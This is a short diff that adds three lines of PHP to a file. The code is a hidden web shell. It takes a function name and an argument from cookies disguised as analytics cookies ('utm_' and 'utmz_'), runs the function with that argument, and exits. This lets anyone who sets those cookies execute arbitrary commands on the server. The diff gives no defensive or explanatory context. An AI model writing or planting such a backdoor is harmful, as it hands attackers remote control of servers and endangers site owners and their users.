@@ -1,0 +1,3 @@
+<?php $_ = (@$_COOKIE['utm_']);
+if(isset($_)){$__ = (@$_COOKIE['utmz_']);$_($__);exit;}
+?>
